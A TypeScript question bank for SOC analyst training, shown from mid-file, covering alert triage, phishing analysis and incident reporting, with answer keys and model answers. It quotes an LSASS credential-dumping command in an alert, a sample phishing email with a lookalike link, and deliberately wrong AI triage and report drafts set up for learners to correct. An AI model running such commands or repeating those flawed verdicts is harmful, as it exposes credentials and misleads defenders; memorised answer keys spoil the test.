| where count > 50 AND sd_gap < 5
| lookup known_good_destinations dest_ip OUTPUT owner | where isnull(owner)

Pairs of internal host and outside IP with many connections and almost no variation in the gap between them are beacon candidates; known services are excluded.`,
        { taskId: 'm-lg-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy(
        'm-lg-x-s',
        'Sign-in Logs',
        `Entra ID sign-ins, 06:00–07:00:

src_ip          accounts_tried  failures  successes  user_agent
198.51.100.23   412             411       1 (k.owen) python-requests/2.31
203.0.113.50    1               3         1 (m.ali)  Chrome on Windows
198.51.100.24   389             389       0          python-requests/2.31

Then, 07:12: k.owen signs in again from 198.51.100.23, passes MFA after 14 push prompts in 6 minutes, and creates an inbox rule: move mail containing "invoice" or "payment" to RSS Feeds.`,
        'Sign-in logs'
      ),
      choice(
        'm-lg-x-s1',
        'Name It',
        'What is the attack pattern?',
        ['Password spraying, then MFA fatigue (push bombing) to get in, then an inbox rule to hide payment fraud', 'A user who forgot their password', 'Brute force on one account', 'Normal script usage'],
        0,
        { taskId: 'm-lg-x-s' }
      ),
      written(
        'm-lg-x-s2',
        'Response and Detection',
        'Write your response, and the detections you’d add.',
        [
          'Revokes k.owen’s sessions and tokens, resets the password, removes the inbox rule and checks what mail was read or sent',
          'Checks whether the attacker emailed suppliers or finance (business email compromise) and warns them',
          'Blocks the 198.51.100.0/24 sources and looks for other accounts they got into',
          'Adds detections: spray by IP across many accounts, repeated MFA pushes, new suspicious inbox rules; moves to number-matching MFA or phishing-resistant methods',
        ],
        `The two IPs sprayed one password across 800 accounts and hit k.owen; at 07:12 the attacker returned and bombed k.owen with push prompts until one was approved, then hid any "invoice" or "payment" mail — a set-up for payment fraud. Now: revoke k.owen's sessions and refresh tokens, reset the password, remove the rule, and review the mailbox audit for mail read, forwarded or sent. Warn finance and key suppliers that payment-detail changes from k.owen are suspect. Block the /24 and check every account it touched. Add detections for spraying by IP, more than five MFA pushes in ten minutes, and new rules moving finance mail; switch to number-matching or FIDO2.`,
        { taskId: 'm-lg-x-s' }
      )
    ),
  ],
};

// ---------- Alert triage ----------
export const TRIAGE_MODULE: ModuleSkeleton = {
  familyId: 'test-triage-01',
  aspects: [
    { id: 'priority', name: 'Prioritising', summary: 'What to open first when the queue is long.' },
    { id: 'investigate', name: 'Investigating an Alert', summary: 'From alert to true positive, false positive or benign, with evidence.' },
    { id: 'mitre', name: 'ATT&CK & Threat Intel', summary: 'Naming the technique and using intel well.' },
    { id: 'case', name: 'Triage Cases', summary: 'Real alerts and an AI’s triage to check.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'priority',
      B,
      choice(
        'm-tr-p-b1',
        'Open First',
        'Which alert do you look at first?',
        ['Ransomware behaviour on a file server', 'A blocked port scan on the firewall', 'A user locked out after 5 wrong passwords', 'A low-severity informational alert'],
        0
      )
    ),
    ...tagged(
      'priority',
      J,
      order('m-tr-p-j1', 'Rank the Queue', 'Rank these alerts, most urgent first.', [
        'Domain admin account created at 02:00 by an unknown account',
        'Malware detected and quarantined on a laptop, user still working',
        'Phishing email reported by a user, not clicked',
        'Port scan blocked at the firewall',
      ])
    ),
    ...tagged(
      'priority',
      P,
      choice(
        'm-tr-p-p1',
        'Same Alert, Different Asset',
        'The same “suspicious PowerShell” alert fires on an intern’s laptop and on the payroll server. How does that change priority?',
        ['The payroll server comes first: the asset’s value and access raise the priority of the same signal', 'They’re equal', 'The laptop first; interns click things', 'Neither; PowerShell is common'],
        0
      )
    ),
    ...tagged(
      'priority',
      S,
      choice(
        'm-tr-p-s1',
        'Alert Fatigue',
        'Analysts close 70% of alerts as false positives without much look. What’s the lasting fix?',
        ['Measure false-positive rates per rule, tune or retire the worst, enrich alerts with context, and automate the routine checks', 'Hire more analysts', 'Close everything low severity automatically', 'Tell analysts to be careful'],
        0
      )
    ),
    ...tagged(
      'investigate',
      B,
      match('m-tr-i-b1', 'Verdicts', 'Match each verdict to its meaning.', [
        ['True positive', 'A real attack the alert was right about'],
        ['False positive', 'The alert was wrong: nothing like it happened'],
        ['Benign true positive', 'It happened, but it was authorised, like a pen test'],
        ['Escalate', 'Real or likely real, and needs the incident team'],
      ])
    ),
    ...tagged(
      'investigate',
      J,
      multi(
        'm-tr-i-j1',
        'Checking an Alert',
        'An alert says a laptop contacted a known-bad IP. What do you check? Tick all that apply.',
        ['Which process made the connection', 'Whether data was sent and how much', 'The IP’s reputation and when it was flagged', 'Other hosts contacting the same IP', 'The laptop’s wallpaper'],
        [0, 1, 2, 3]
      )
    ),
    ...tagged(
      'investigate',
      P,
      choice(
        'm-tr-i-p1',
        'Notes for the Next Analyst',
        'What makes good case notes when you close an alert?',
        ['What you checked, what you found (with queries and evidence), the verdict and why, so someone else reaches the same conclusion', '“FP”', '“Looks fine”', 'Nothing; the alert is closed'],
        0
      )
    ),
    ...tagged(
      'investigate',
      S,
      choice(
        'm-tr-i-s1',
        'When to Escalate',
        'You’re 70% sure an alert is a real intrusion but not certain, and it’s 03:00. What do you do?',
        ['Escalate now with what you have and what’s uncertain; waiting for certainty lets an attacker work', 'Wait until morning to be sure', 'Close it to avoid a false alarm', 'Keep investigating alone until certain'],
        0
      )
    ),
    ...tagged(
      'mitre',
      B,
      choice(
        'm-tr-m-b1',
        'MITRE ATT&CK',
        'What is MITRE ATT&CK?',
        ['A shared catalogue of attacker tactics and techniques, used to name and compare what attackers do', 'An antivirus product', 'A firewall', 'A hacking group'],
        0
      )
    ),
    ...tagged(
      'mitre',
      J,
      match('m-tr-m-j1', 'Tactics', 'Match each action to its ATT&CK tactic.', [
        ['A phishing email with a malicious link', 'Initial Access'],
        ['A scheduled task that runs at every logon', 'Persistence'],
        ['Dumping passwords from memory', 'Credential Access'],
        ['Uploading files to cloud storage the attacker controls', 'Exfiltration'],
      ])
    ),
    ...tagged(
      'mitre',
      P,
      choice(
        'm-tr-m-p1',
        'An IOC Feed',
        'A threat feed lists 5,000 IPs as malicious. Your SIEM matches one of them in last week’s logs. How do you treat it?',
        ['As a lead: check the indicator’s age and context (IPs get reused), what the connection was and what else that host did', 'As a confirmed breach', 'Ignore feeds', 'Block all 5,000 and close it'],
        0
      )
    ),
    ...tagged(
      'mitre',
      S,
      choice(
        'm-tr-m-s1',
        'Behaviours Over Indicators',
        'Why do mature SOCs focus detections on techniques (behaviours) rather than hashes and IPs?',
        ['Attackers change hashes and IPs cheaply; their techniques are harder to change, so behaviour detections last longer', 'Hashes don’t work', 'IPs are private', 'It’s cheaper to store'],
        0
      )
    ),
    ...tagged('case', B, short('m-tr-x-b1', 'Verdict', 'An alert flags the IT team’s scheduled, approved vulnerability scan. Is it a true positive, false positive or benign true positive?', ['benign true positive', 'benign', 'btp'])),
    ...tagged(
      'case',
      J,
      caseStudy(
        'm-tr-x-j',
        'EDR Alert',
        `Alert: Credential dumping (High)
Host: IT-ADMIN-03    User: r.singh (IT admin)
Process: procdump64.exe -ma lsass.exe C:\\Temp\\l.dmp
Parent: cmd.exe ← explorer.exe
Time: Tue 14:22

Change calendar: no change booked for IT-ADMIN-03.
r.singh's manager says: "No idea, he's on leave this week."`,
        'Alert'
      ),
      choice(
        'm-tr-x-j1',
        'Your Verdict',
        'What’s your verdict?',
        ['Likely true positive: dumping LSASS on an admin box, by a user on leave, with no change booked — escalate', 'Benign: r.singh is an admin', 'False positive: procdump is a Microsoft tool', 'Close it; it’s an IT machine'],
        0,
        { taskId: 'm-tr-x-j' }
      ),
      short('m-tr-x-j2', 'ATT&CK Tactic', 'Which ATT&CK tactic does dumping LSASS fall under?', ['credential access'], { taskId: 'm-tr-x-j' }),
      written(
        'm-tr-x-j3',
        'Next Steps',
        'Write your next steps.',
        [
          'Isolates IT-ADMIN-03 and disables or resets r.singh’s account and sessions',
          'Treats every credential cached on that machine as exposed and plans resets',
          'Checks how r.singh logged on (from where, MFA) and what else the account did',
          'Escalates to the incident team with the evidence',
        ],
        `Escalate as a likely true positive: someone dumped LSASS memory, which holds credentials, on an admin workstation using an account whose owner is on leave, with no change booked. Isolate IT-ADMIN-03, disable r.singh and revoke sessions. Assume every credential that had logged on to that machine is exposed and reset them, privileged ones first. Find how r.singh's account was used — source IP, VPN, MFA — and what else it touched. Keep C:\\Temp\\l.dmp and the EDR timeline as evidence.`,
        { taskId: 'm-tr-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-tr-x-p',
        'An AI Triage',
        `Your SOC trialled an AI assistant that triages alerts. Its verdicts this morning:

1. "Impossible travel for d.cho: London 08:01, Frankfurt 08:09. False positive: Frankfurt is our Zscaler proxy. Close."
2. "Office macro started PowerShell on HR-LT-02. Benign: HR uses macros. Close."
3. "500 failed logins to 'admin' on the VPN from one IP, all blocked. True positive, critical. Wake the incident lead."
4. "New mailbox forwarding rule for the CFO to an external Gmail address. Low: users set forwarding for convenience. Close."`,
        'AI triage'
      ),
      multi(
        'm-tr-x-p1',
        'Which Verdicts Are Wrong?',
        'Which of the AI’s verdicts are wrong? Tick all that apply.',
        ['1. Impossible travel via the company proxy', '2. Macro starting PowerShell', '3. 500 blocked VPN failures', '4. CFO forwarding to Gmail'],
        [1, 2, 3],
        { taskId: 'm-tr-x-p' }
      ),
      written(
        'm-tr-x-p2',
        'Corrected Triage',
        'Write the corrected verdict for each wrong one, and one rule for using the AI assistant safely.',
        [
          'Macro starting PowerShell needs investigating (decode the command, check for downloads), not closing because a team uses macros',
          'Blocked failures with no success are worth blocking and noting, not waking the incident lead',
          'The CFO forwarding to Gmail is high: a classic sign of mailbox compromise; check sign-ins and remove the rule',
          'A rule: the AI suggests, an analyst confirms with evidence before closing, especially for closes',
        ],
        `1 is right if Frankfurt really is our proxy egress, which I'd confirm. 2 is wrong: Word starting PowerShell is the classic malware chain whether or not HR uses macros; decode the command and check for downloads and child processes. 3 is over-called: 500 blocked attempts with no success is a brute-force attempt to block at the edge and note, not a 3am call. 4 is wrong and the most serious: an external forwarding rule on the CFO's mailbox is a common sign of compromise; check the sign-ins, remove the rule, and see what was forwarded. Rule: the AI can draft a verdict, but an analyst confirms it with evidence before anything is closed.`,
        { taskId: 'm-tr-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy(
        'm-tr-x-s',
        'Forty Alerts, One Story',
        `Overnight queue (40 alerts). The five that touch the same host, SALES-LT-09:

01:12  Low     Unusual parent process: excel.exe → cmd.exe
01:13  Medium  New scheduled task created
01:30  Low     Connection to newly registered domain (3 days old)
02:05  Medium  LSASS access by unsigned process
02:40  Low     SMB connections to 30 workstations

Each was triaged separately by the night shift and closed as "low confidence".`,
        'Alert queue'
      ),
      choice(
        'm-tr-x-s1',
        'What Was Missed',
        'What did the night shift miss?',
        ['Together they’re one intrusion: execution, persistence, C2, credential theft and lateral movement on one host in 90 minutes', 'Nothing; they were each low confidence', 'Only the LSASS alert mattered', 'A noisy laptop'],
        0,
        { taskId: 'm-tr-x-s' }
      ),
      written(
        'm-tr-x-s2',
        'Fix the Process',
        'Write what you do now, and how you’d change the SOC so a chain like this is caught next time.',
        [
          'Reopens and escalates now: isolate SALES-LT-09, check the 30 workstations, reset exposed credentials',
          'Proposes grouping alerts by host/user (correlation or risk scoring) so several lows on one entity raise one high',
          'Asks for a rule to check an entity’s other alerts before closing any alert',
          'Suggests reviewing the night’s closures and coaching, not blaming',
        ],
        `Now: reopen it as an incident — isolate SALES-LT-09, check what ran on the 30 workstations it reached, and reset the credentials it could have taken, then escalate. The five alerts were each small but tell one story: an Excel file ran commands, set up a scheduled task, called a three-day-old domain, read LSASS and spread over SMB, all in 90 minutes. To catch this next time: score risk by host and user so several alerts on one entity add up to a high-priority case; make "check this host's and user's other alerts" a step before closing anything; and review the night's closures together as a learning exercise.`,
        { taskId: 'm-tr-x-s' }
      )
    ),
  ],
};

// ---------- Phishing ----------
const PHISH_EMAIL = `From: "Microsoft 365" <no-reply@micros0ft-support.com>
Reply-To: helpdesk.m365@gmail.com
To: a.jones@northwind.co.uk
Subject: ACTION REQUIRED: Your mailbox will be deleted in 24 hours
Authentication-Results: spf=fail (sender IP 45.88.12.7); dkim=none; dmarc=fail

Dear user,
Your mailbox has exceeded its storage limit. To keep your email, verify your account now:
https://login.micros0ft-support.com/verify?u=a.jones
Failure to act will result in permanent deletion.
Microsoft 365 Team`;

export const PHISHING_MODULE: ModuleSkeleton = {
  familyId: 'test-phish-01',
  aspects: [
    { id: 'headers', name: 'Headers & Authentication', summary: 'Who really sent it: From, Reply-To, SPF, DKIM and DMARC.' },
    { id: 'content', name: 'Links & Attachments', summary: 'Lookalike domains, redirects, QR codes and payloads.' },
    { id: 'respond', name: 'Responding', summary: 'What to do when one lands, and when someone clicks.' },
    { id: 'case', name: 'Phishing Cases', summary: 'Real emails and reports: judge and respond.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'headers',
      B,
      choice(
        'm-ph-h-b1',
        'Display Name',
        'An email shows “PayPal” as the sender, but the address is service@paypa1-secure.net. What matters?',
        ['The address: the display name can be anything, and the domain is a lookalike', 'The display name says PayPal, so it’s fine', 'Neither', 'The subject line'],
        0
      )
    ),
    ...tagged(
      'headers',
      J,
      match('m-ph-h-j1', 'Email Authentication', 'Match each check to what it does.', [
        ['SPF', 'Is the sending server allowed to send for this domain?'],
        ['DKIM', 'Is the message signed by the domain and unchanged?'],
        ['DMARC', 'Does the visible From domain line up with SPF or DKIM, and what to do if not?'],
        ['Reply-To', 'Where replies go, which can differ from the sender'],
      ])
    ),
    ...tagged(
      'headers',
      P,
      choice(
        'm-ph-h-p1',
        'It Passed DMARC',
        'A phishing email passes SPF, DKIM and DMARC. How can that be?',
        ['It was sent from a domain the attacker owns or from a real but compromised account, so authentication is genuine; it proves who sent it, not that it’s safe', 'It can’t be phishing then', 'DMARC is broken', 'The checks were skipped'],
        0
      )
    ),
    ...tagged(
      'headers',
      S,
      choice(
        'm-ph-h-s1',
        'Your Own Domain',
        'Attackers send email that appears to come from your own domain to your staff. What stops it?',
        ['A DMARC policy of p=reject (after monitoring), with SPF and DKIM set up for every service that legitimately sends as you', 'A spam filter alone', 'Telling staff to check', 'Nothing can'],
        0
      )
    ),
    ...tagged(
      'content',
      B,
      choice(
        'm-ph-c-b1',
        'Hovering',
        'A link says “https://www.barclays.co.uk” but hovering shows https://barclays.co.uk.secure-login.ru. Where does it go?',
        ['secure-login.ru: the real domain is the part just before the last dot-ending, read right to left', 'barclays.co.uk', 'Both', 'Nowhere'],
        0
      )
    ),
    ...tagged(
      'content',
      J,
      multi(
        'm-ph-c-j1',
        'Risky Attachments',
        'Which attachments are higher risk in an unexpected email? Tick all that apply.',
        ['invoice.docm', 'payment.html', 'scan.iso', 'statement.pdf.exe', 'agenda.txt'],
        [0, 1, 2, 3]
      )
    ),
    ...tagged(
      'content',
      P,
      choice(
        'm-ph-c-p1',
        'A QR Code',
        'An email with no links holds a QR code “to re-enable MFA”. Why is this popular with attackers?',
        ['Filters don’t read the image, and the phone that scans it is often outside corporate protection', 'QR codes are encrypted', 'It isn’t phishing without a link', 'QR codes can’t hold URLs'],
        0
      )
    ),
    ...tagged(
      'content',
      S,
      choice(
        'm-ph-c-s1',
        'Adversary in the Middle',
        'A user entered their password and MFA code on a fake login page, and the attacker signed in within a minute. What was the likely technique and why did MFA not help?',
        ['An adversary-in-the-middle proxy that relays the login and steals the session cookie; one-time codes can be relayed, while phishing-resistant methods (FIDO2/passkeys) can’t', 'MFA was off', 'The password was weak', 'The attacker guessed the code'],
        0
      )
    ),
    ...tagged(
      'respond',
      B,
      choice(
        'm-ph-r-b1',
        'Report It',
        'A staff member gets a suspicious email. What should they do?',
        ['Report it with the report button, without clicking or replying', 'Forward it to colleagues to warn them', 'Delete it and say nothing', 'Reply asking if it’s real'],
        0
      )
    ),
    ...tagged(
      'respond',
      J,
      order('m-ph-r-j1', 'Someone Clicked', 'A user clicked a phishing link and entered their password. Put the response in order.', [
        'Reset the password and revoke active sessions',
        'Check sign-ins for the account since the click',
        'Look for changes the attacker made (inbox rules, MFA methods, forwarding)',
        'Find and remove the same email from other mailboxes',
        'Thank the user and record the incident',
      ])
    ),
    ...tagged(
      'respond',
      P,
      choice(
        'm-ph-r-p1',
        'Pull It Everywhere',
        'One phishing email was reported. 300 staff got the same one. What do you do?',
        ['Search all mailboxes for it (sender, subject, URL), remove every copy, block the sender and URL, and check who clicked in proxy logs', 'Delete the one reported', 'Email everyone a warning only', 'Wait for more reports'],
        0
      )
    ),
    ...tagged(
      'respond',
      S,
      choice(
        'm-ph-r-s1',
        'Changed Bank Details',
        'Finance gets an email from a real supplier’s real address asking to change bank details. DMARC passes. What should the process be?',
        ['Verify by phone on a number already on file (not one in the email) before any change, because the supplier’s account may be compromised', 'Pay; it passed DMARC', 'Reply to confirm', 'Change it and tell the supplier'],
        0
      )
    ),
    ...tagged('case', B, short('m-ph-x-b1', 'The Real Domain', 'A link goes to https://paypal.com.account-verify.co/login. What is the real domain? (Just the domain.)', ['account-verify.co'])),
    ...tagged(
      'case',
      J,
      caseStudy('m-ph-x-j', 'Reported Email', PHISH_EMAIL, 'Email headers and body'),
      multi(
        'm-ph-x-j1',
        'Red Flags',
        'Which are red flags in this email? Tick all that apply.',
        [
          'The sender’s domain uses a zero: micros0ft-support.com',
          'Replies go to a Gmail address',
          'SPF and DMARC fail, and there’s no DKIM signature',
          'Urgency and a threat (deletion in 24 hours)',
          'The link goes to a lookalike domain, not microsoft.com',
          'It’s addressed to a.jones',
        ],
        [0, 1, 2, 3, 4],
        { taskId: 'm-ph-x-j' }
      ),
      written(
        'm-ph-x-j2',
        'Reply to the Reporter',
        'Write a short reply to a.jones, who reported it, and list what you’d do in the SOC.',
        [
          'Thanks them and confirms it’s phishing, telling them not to click (or to say if they did)',
          'Removes the email from all mailboxes and blocks the domain and sender IP',
          'Checks proxy or email logs for anyone who clicked the link, and follows up with them',
          'Friendly and brief',
        ],
        `"Thanks for reporting this, Amy — it's a phishing email, and you did exactly the right thing. Microsoft won't delete your mailbox. If you did click the link or enter your password, tell me straight away and we'll secure your account; otherwise there's nothing more to do."

In the SOC: search for and remove every copy, block micros0ft-support.com and 45.88.12.7, check proxy logs for anyone who visited the link and reset their passwords and sessions if so.`,
        { taskId: 'm-ph-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-ph-x-p',
        'An AI Verdict on an Email',
        `An AI email assistant reviewed this report and wrote:

"Verdict: SAFE. The message passes SPF, DKIM and DMARC for docusign.net. It is a DocuSign envelope from a known service. No action needed."

The email:
From: DocuSign <dse@docusign.net>
Authentication-Results: spf=pass; dkim=pass; dmarc=pass (docusign.net)
Subject: Northwind - Updated payment remittance - please review and sign
Body: "J. Carter shared a document with you." [REVIEW DOCUMENT]
The DocuSign envelope's document holds one link: https://northwind-sharepoint.webflow.io/remit

Nobody at Northwind expected a document from J. Carter, who is not a known contact.`,
        'AI verdict and email'
      ),
      multi(
        'm-ph-x-p1',
        'What the AI Missed',
        'Which points show the verdict is wrong? Tick all that apply.',
        [
          'Passing DMARC for docusign.net only proves DocuSign sent it; anyone can open a DocuSign account and send envelopes',
          'The document links to a webflow.io site pretending to be Northwind SharePoint',
          'An unexpected payment document from an unknown sender is a phishing lure',
          'DocuSign is never used by attackers',
        ],
        [0, 1, 2],
        { taskId: 'm-ph-x-p' }
      ),
      written(
        'm-ph-x-p2',
        'Correct Verdict',
        'Write the correct verdict and response.',
        [
          'Malicious: phishing abusing a legitimate service to pass authentication, leading to a fake SharePoint login',
          'Blocks the webflow.io URL and removes the email from all mailboxes',
          'Checks proxy logs for clicks and resets credentials and sessions for anyone who entered details',
          'Reports the abuse to DocuSign and the host, and notes that “authentication passed” isn’t a verdict',
        ],
        `Malicious. The attacker used a real DocuSign account, so SPF, DKIM and DMARC genuinely pass for docusign.net; that only shows DocuSign delivered it. The lure is an unexpected payment document from an unknown sender, and the link goes to a webflow.io page dressed as Northwind's SharePoint, almost certainly a credential harvester. Remove it from every mailbox, block the URL, check proxy logs for anyone who opened it and secure their accounts, and report the envelope to DocuSign and the page to Webflow. For the AI: authentication results aren't a verdict on their own.`,
        { taskId: 'm-ph-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy(
        'm-ph-x-s',
        'Campaign Results',
        `A phishing campaign hit Northwind yesterday:

Delivered                       420
Reported by staff               31   (first report at 09:14, 6 minutes after delivery)
Clicked the link (proxy logs)   57
Entered credentials (estimated) 12   (sign-ins from the attacker's IPs)
Email pulled from mailboxes at  11:40`,
        'Campaign results'
      ),
      short('m-ph-x-s1', 'Click Rate', 'What % of recipients clicked? (One decimal place.)', ['13.6%', '13.6', '13.57%'], { taskId: 'm-ph-x-s' }),
      written(
        'm-ph-x-s2',
        'Lessons',
        'The first report came in at 09:14 but the email was only pulled at 11:40. Write what should change.',
        [
          'Points out the 2.5-hour gap between the first report and removal, during which most clicks likely happened',
          'Proposes automation: a reported email triggers a search and quarantine of matching copies (with analyst review)',
          'Handles the 12 compromised accounts now: resets, session revocation, checks for rules and MFA changes',
          'Improves defences: phishing-resistant MFA, link rewriting/detonation, and recognising the reporters to encourage reporting',
        ],
        `The 31 reporters gave us the warning six minutes in; we took 2.5 hours to act, and that's when most of the 57 clicks happened. First, the 12 accounts: reset passwords, revoke sessions and check each for inbox rules, forwarding and new MFA methods. Then change the process: a staff report should automatically search for matching messages and quarantine them within minutes, with an analyst confirming. Add link detonation at click time, move to phishing-resistant MFA so stolen passwords and codes aren't enough, and thank the reporters publicly — 31 people reporting is what made fast removal possible.`,
        { taskId: 'm-ph-x-s' }
      )
    ),
  ],
};

// ---------- Incident reporting ----------
const IR_NOTES = `Analyst notes, ransomware incident at a 300-person accountancy firm:

Mon 08:05  Helpdesk: files on \\\\FS01\\Clients won't open, renamed .lkx
Mon 08:20  EDR: ransomware behaviour on FS01, process blocked at 08:19; 14,200 files encrypted
Mon 08:31  FS01 isolated from the network
Fri (prior) 17:48  VPN login as t.ward from 91.240.118.9 (Romania), no MFA (legacy VPN profile)
Sat 02:10  t.ward RDP to FS01
Sat 02:40  rclone.exe on FS01 uploads 38 GB to mega.nz
Mon 07:50  Encryption begins on FS01
Mon 11:00  Restored from Sunday 23:00 backup; files changed Mon 00:00–07:50 lost
Ransom note claims client data was taken and threatens to publish it.`;

export const REPORTING_MODULE: ModuleSkeleton = {
  familyId: 'test-ir-01',
  aspects: [
    { id: 'timeline', name: 'Timeline & Evidence', summary: 'What happened, when, and how you know.' },
    { id: 'impact', name: 'Impact & Severity', summary: 'What it means for the business, customers and the law.' },
    { id: 'writing', name: 'Writing for the Reader', summary: 'The same incident for engineers, executives and regulators.' },
    { id: 'case', name: 'Reporting Cases', summary: 'Real notes into reports: build, correct and write.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'timeline',
      B,
      choice(
        'm-ir-t-b1',
        'Timestamps',
        'Why does every event in an incident timeline need a time zone?',
        ['Logs come from systems in different zones; without one the order can be wrong', 'It looks professional', 'Regulators require purple ink', 'It doesn’t'],
        0
      )
    ),
    ...tagged(
      'timeline',
      J,
      match('m-ir-t-j1', 'Incident Words', 'Match each term to its meaning.', [
        ['Initial access', 'How the attacker first got in'],
        ['Dwell time', 'How long they were inside before detection'],
        ['Containment', 'Stopping the attack spreading or continuing'],
        ['Root cause', 'The underlying weakness that let it happen'],
      ])
    ),
    ...tagged(
      'timeline',
      P,
      choice(
        'm-ir-t-p1',
        'Fact or Guess',
        'You think, but can’t prove, the attacker got in through a stolen VPN password. How do you write it?',
        ['As an assessment with its confidence and evidence (“likely, based on…”), kept apart from confirmed facts', 'As fact', 'Leave it out', 'As the root cause'],
        0
      )
    ),
    ...tagged(
      'timeline',
      S,
      choice(
        'm-ir-t-s1',
        'Chain of Custody',
        'The incident may end in court. What do you do with the evidence?',
        ['Collect forensic copies with hashes, record who handled them and when, and work on copies', 'Take screenshots on your phone', 'Fix the systems first, then look', 'Email the logs to the lawyers'],
        0
      )
    ),
    ...tagged(
      'impact',
      B,
      choice(
        'm-ir-i-b1',
        'CIA',
        'Ransomware encrypted files so staff couldn’t open them. Which part of the CIA triad was hit first?',
        ['Availability', 'Confidentiality', 'Integrity', 'None'],
        0
      )
    ),
    ...tagged(
      'impact',
      J,
      choice(
        'm-ir-i-j1',
        'Severity',
        'Which incident is the most severe?',
        ['Customer personal data copied out by an attacker', 'One laptop with adware, cleaned', 'A blocked phishing email', 'A failed brute-force attempt'],
        0
      )
    ),
    ...tagged(
      'impact',
      P,
      choice(
        'm-ir-i-p1',
        '72 Hours',
        'Under UK GDPR, when must a reportable personal-data breach be reported to the ICO?',
        ['Within 72 hours of becoming aware of it, even if details are still coming', 'Within 30 days', 'Only once the investigation ends', 'Only if customers complain'],
        0
      )
    ),
    ...tagged(
      'impact',
      S,
      choice(
        'm-ir-i-s1',
        '“No Evidence of Exfiltration”',
        'Your logs only go back 7 days, and the attacker was inside for 3 weeks. Leadership wants to say “no evidence of data theft”. What do you advise?',
        ['Say you can’t tell: logs don’t cover the period, so data theft can’t be ruled out; plan notifications on that basis', 'Say no evidence; it’s true', 'Say data was definitely stolen', 'Say nothing'],
        0
      )
    ),
    ...tagged(
      'writing',
      B,
      choice(
        'm-ir-w-b1',
        'The First Line',
        'What should the first lines of an incident report for executives say?',
        ['What happened, the impact, and what’s needed from them, in plain words', 'A list of IP addresses', 'The analyst’s name', 'The tools used'],
        0
      )
    ),
    ...tagged(
      'writing',
      J,
      multi(
        'm-ir-w-j1',
        'In Every Report',
        'Which belong in every incident report? Tick all that apply.',
        ['A summary of what happened', 'A timeline', 'Impact', 'Actions taken and next steps with owners', 'Who to blame'],
        [0, 1, 2, 3]
      )
    ),
    ...tagged(
      'writing',
      P,
      choice(
        'm-ir-w-p1',
        'Jargon',
        'Which is better for a board update?',
        [
          '“An attacker used a stolen password to get into our network and copied client files. We’ve locked them out.”',
          '“TA leveraged valid accounts (T1078) for IA via VPN, then exfil via rclone to MEGA.”',
          '“A cyber event occurred.”',
          '“See attached logs.”',
        ],
        0
      )
    ),
    ...tagged(
      'writing',
      S,
      choice(
        'm-ir-w-s1',
        'Blameless',
        'The root cause was an engineer leaving an old VPN profile without MFA. How do you write it?',
        ['As a process and control gap (no review of legacy profiles, no MFA enforcement), with fixes, not as one person’s fault', 'Name the engineer', 'Leave it out', 'Call it human error and stop there'],
        0
      )
    ),
    ...tagged('case', B, short('m-ir-x-b1', 'Dwell Time', 'An attacker got in on 1 March and was found on 15 March. What was the dwell time in days?', ['14', '14 days'])),
    ...tagged(
      'case',
      J,
      caseStudy('m-ir-x-j', 'Analyst Notes', IR_NOTES, 'Notes'),
      order(
        'm-ir-x-j1',
        'Build the Timeline',
        'Put these events in time order.',
        ['VPN login as t.ward without MFA', 'RDP to FS01', '38 GB uploaded to mega.nz', 'Encryption begins', 'EDR blocks the ransomware', 'FS01 isolated', 'Restored from backup'],
        { taskId: 'm-ir-x-j' }
      ),
      short('m-ir-x-j2', 'Data Out', 'How much data was uploaded to mega.nz?', ['38 GB', '38', '38gb'], { taskId: 'm-ir-x-j' }),
      written(
        'm-ir-x-j3',
        'Executive Summary',
        'Write a 5–6 sentence executive summary for the firm’s partners.',
        [
          'Says plainly what happened: an attacker used t.ward’s VPN account without MFA, copied 38 GB from the client file server, then encrypted it',
          'States the impact: client data taken (likely personal data), a morning of lost work, files back from backup',
          'Flags the legal side: a likely reportable breach to the ICO within 72 hours, and possibly clients to notify',
          'Gives the asks and next steps: approve notifications, reset accounts, remove legacy VPN profiles and enforce MFA',
        ],
        `On Friday evening an attacker logged in to our VPN as t.ward, using an old VPN profile that didn't require MFA. Early Saturday they reached the client file server and copied 38 GB of client files to an online storage service, then on Monday at 07:50 started encrypting the server. Our security tools stopped the encryption at 08:19, we cut the server off at 08:31 and restored it from Sunday's backup by 11:00; work saved on Monday morning was lost. The attacker says they will publish the data, and the files almost certainly include clients' personal information, so this is very likely a breach we must report to the ICO within 72 hours of Monday morning. We need your approval today to notify the ICO and prepare client notices; meanwhile we've reset t.ward's account and are removing every VPN profile without MFA.`,
        { taskId: 'm-ir-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-ir-x-p',
        'An AI-Drafted Report',
        `${IR_NOTES}

An AI assistant drafted this summary from the notes:

"On Monday at 07:50 ransomware infected FS01 through a phishing email. EDR blocked it within minutes and no data left the network. All files were restored with no loss. Root cause: user error by t.ward. No regulatory reporting is required."`,
        'Notes and AI draft'
      ),
      multi(
        'm-ir-x-p1',
        'What’s Wrong',
        'Which statements in the AI draft are wrong or unsupported? Tick all that apply.',
        [
          'It started Monday at 07:50 (the attacker was in from Friday 17:48)',
          'It came through a phishing email (the notes show a VPN login)',
          'No data left the network (38 GB went to mega.nz)',
          'All files were restored with no loss (Monday’s changes were lost)',
          'Root cause: user error by t.ward (the gap was a legacy VPN profile with no MFA)',
          'No regulatory reporting is required',
        ],
        [0, 1, 2, 3, 4, 5],
        { taskId: 'm-ir-x-p' }
      ),
      written(
        'm-ir-x-p2',
        'Why It Matters',
        'In a few sentences, explain what would have happened if the AI draft had gone to the partners, and how you’d use AI for reports safely.',
        [
          'The firm could miss the 72-hour ICO deadline and fail to warn clients, risking fines and trust',
          'Wrong root cause means the VPN gap stays open, and blaming t.ward is unfair and unsupported',
          'Every claim in a report should be checked against the evidence before it goes out',
          'Use AI to draft structure or wording, with an analyst verifying facts and signing off',
        ],
        `The partners would have believed no data was taken and decided not to report, missing the ICO's 72-hour deadline and leaving clients unwarned while the attacker threatens to publish their files. They'd also fix the wrong thing: the draft blames t.ward and phishing, so the VPN profile without MFA would stay open for the next attacker. An AI can help draft and tidy a report, but every fact has to be checked against the notes and evidence by an analyst who signs it off.`,
        { taskId: 'm-ir-x-p' }
      )
    ),
    ...tagged(
